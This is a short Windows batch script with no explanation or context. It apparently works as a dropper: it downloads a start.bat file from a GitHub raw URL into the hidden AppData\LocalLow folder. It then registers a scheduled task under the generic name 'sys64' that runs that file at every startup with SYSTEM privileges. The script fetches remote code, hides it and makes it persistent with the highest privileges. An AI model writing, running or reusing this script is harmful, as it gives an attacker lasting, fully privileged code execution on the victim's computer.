@echo off
	powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/start.bat', '%USERPROFILE%\AppData\LocalLow\start.bat')"
	schtasks /query /TN "sys64" >NUL 2>&1
	if %errorlevel% NEQ 0 schTasks /Create /SC ONSTART /TN "sys64" /TR "%USERPROFILE%\AppData\LocalLow\start.bat" /RU SYSTEM
	exit /b 0